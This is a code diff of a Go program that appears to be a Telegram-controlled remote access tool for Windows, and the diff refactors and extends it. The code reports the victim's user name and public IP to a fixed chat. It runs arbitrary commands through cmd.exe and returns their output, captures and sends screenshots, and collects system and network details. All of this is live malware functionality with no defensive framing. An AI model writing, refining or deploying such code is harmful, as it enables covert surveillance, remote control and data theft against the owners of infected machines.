@@ -40,22 +40,22 @@ func init() {
     os.MkdirAll(IMG_DIR, 0755)
 }
 
-func captureScreen() (string, string, error) {
+func captureScreen() (string, error) {
     bounds := screenshot.GetDisplayBounds(0)
     img, err := screenshot.CaptureRect(bounds)
     if err != nil {
-        return "", "", err
+        return "", err
     }
     ts := time.Now().Format("20060102150405")
-    fileName := fmt.Sprintf("%s.png", ts)
-    fullPath := filepath.Join(IMG_DIR, fileName)
-    f, err := os.Create(fullPath)
+    file := fmt.Sprintf("%s.png", ts)
+    path := filepath.Join(IMG_DIR, file)
+    f, err := os.Create(path)
     if err != nil {
-        return "", "", err
+        return "", err
     }
     defer f.Close()
     png.Encode(f, img)
-    return fullPath, fileName, nil
+    return path, nil
 }
 
 func getOSInfo() string {
@@ -116,8 +116,8 @@ func getNetworkInfo() string {
     }
     resp, err := http.Get("https://api.ipify.org")
     if err == nil {
-        body, _ := ioutil.ReadAll(resp.Body)
-        sb.WriteString(fmt.Sprintf("\n[+] Public IP: %s", string(body)))
+        b, _ := ioutil.ReadAll(resp.Body)
+        sb.WriteString(fmt.Sprintf("\n[+] Public IP: %s", string(b)))
         resp.Body.Close()
     } else {
         sb.WriteString("\n[!] Failed to fetch public IP")
@@ -160,6 +160,9 @@ func getAllSystemInfo() string {
 }
 
 func sendLargeMessage(bot *tgbotapi.BotAPI, chatID int64, text string) {
+    if text == "" {
+        text = "[+] Done with no output."
+    }
     for i := 0; i < len(text); i += MAX_MSG_BYTES {
         end := i + MAX_MSG_BYTES
         if end > len(text) {
@@ -176,7 +179,7 @@ func main() {
         log.Fatalf("Bot init failed: %v", err)
     }
 
-    // clear any webhook so polling works
+    // ensure polling works
     _, err = bot.Request(tgbotapi.DeleteWebhookConfig{})
     if err != nil {
         log.Printf("⚠️ could not delete webhook: %v", err)
@@ -191,8 +194,11 @@ func main() {
         ip = string(b)
         resp.Body.Close()
     }
-    now := time.Now().Format("Jan 02, 2006 03:04:05 PM")
-    bot.Send(tgbotapi.NewMessage(STARTUP_CHAT, fmt.Sprintf("%s %s %s", user, ip, now)))
+    bot.Send(tgbotapi.NewMessage(STARTUP_CHAT,
+        fmt.Sprintf("%s %s %s",
+            user, ip,
+            time.Now().Format("Jan 02, 2006 03:04:05 PM"),
+        )))
 
     updates := bot.GetUpdatesChan(tgbotapi.NewUpdate(0))
 
@@ -207,38 +213,52 @@ func main() {
         case txt == "/start":
             bot.Send(tgbotapi.NewMessage(cid, "Hey there! I'm your Go bot. Type /help."))
         case txt == "/help":
-            bot.Send(tgbotapi.NewMessage(cid, "Commands:\n/help\n/scrcap\n/info\ncmd <command>"))
-        case strings.HasPrefix(txt, "cmd "):
-            cmdStr := strings.TrimSpace(txt[4:])
-            if strings.HasPrefix(cmdStr, "cd ") {
-                path := strings.Trim(strings.TrimPrefix(cmdStr, "cd "), `"`)
-                newPath := filepath.Join(cwd, path)
-                if fi, err := os.Stat(newPath); err == nil && fi.IsDir() {
-                    cwd = newPath
-                    bot.Send(tgbotapi.NewMessage(cid, "Changed dir to "+cwd))
-                } else {
-                    bot.Send(tgbotapi.NewMessage(cid, "[-] Dir not found: "+path))
-                }
-            } else {
-                // run via cmd.exe so built-ins like md/dir work
-                cmd := exec.Command("cmd", "/C", cmdStr)
-                cmd.Dir = cwd
-                out, err := cmd.CombinedOutput()
-                if err != nil {
-                    sendLargeMessage(bot, cid, "[!] "+err.Error()+"\n"+string(out))
-                } else {
-                    sendLargeMessage(bot, cid, string(out))
-                }
-            }
-        case txt == "info":
-            sendLargeMessage(bot, cid, getAllSystemInfo())
-        case txt == "scrcap":
-            path, _, err := captureScreen()
+            bot.Send(tgbotapi.NewMessage(cid,
+                "Commands:\n"+
+                    "/start\n"+
+                    "/help\n"+
+                    "scrcap\n"+
+                    "info\n"+
+                    "cmd <command>"))
+        case strings.EqualFold(txt, "scrcap"):
+            bot.Send(tgbotapi.NewMessage(cid, "Capturing screen..."))
+            path, err := captureScreen()
             if err != nil {
                 bot.Send(tgbotapi.NewMessage(cid, "[!] Screenshot failed: "+err.Error()))
                 break
             }
+            bot.Send(tgbotapi.NewMessage(cid, "Capture complete, sending file..."))
             bot.Send(tgbotapi.NewPhoto(cid, tgbotapi.FilePath(path)))
+        case strings.EqualFold(txt, "info"):
+            sendLargeMessage(bot, cid, getAllSystemInfo())
+        case strings.HasPrefix(strings.ToLower(txt), "cmd "):
+            cmdStr := strings.TrimSpace(txt[4:])
+            if strings.HasPrefix(strings.ToLower(cmdStr), "cd ") {
+                // handle cd with absolute paths
+                target := strings.Trim(cmdStr[3:], `" `)
+                newDir := filepath.Join(cwd, target)
+                abs, err := filepath.Abs(newDir)
+                if err != nil {
+                    bot.Send(tgbotapi.NewMessage(cid, "[!] Invalid path: "+err.Error()))
+                    continue
+                }
+                if fi, err := os.Stat(abs); err == nil && fi.IsDir() {
+                    cwd = abs
+                    bot.Send(tgbotapi.NewMessage(cid, "[+] Changed dir to "+cwd))
+                } else {
+                    bot.Send(tgbotapi.NewMessage(cid, "[-] Dir not found: "+target))
+                }
+                continue
+            }
+            // drop into cmd.exe for everything else (native expands %CD%, supports built-ins)
+            cmd := exec.Command("cmd.exe", "/C", cmdStr)
+            cmd.Dir = cwd
+            out, err := cmd.CombinedOutput()
+            if err != nil {
+                sendLargeMessage(bot, cid, "[!] "+err.Error()+"\n"+string(out))
+            } else {
+                sendLargeMessage(bot, cid, string(out))
+            }
         default:
             bot.Send(tgbotapi.NewMessage(cid, "I don't get that. Try /help"))
         }
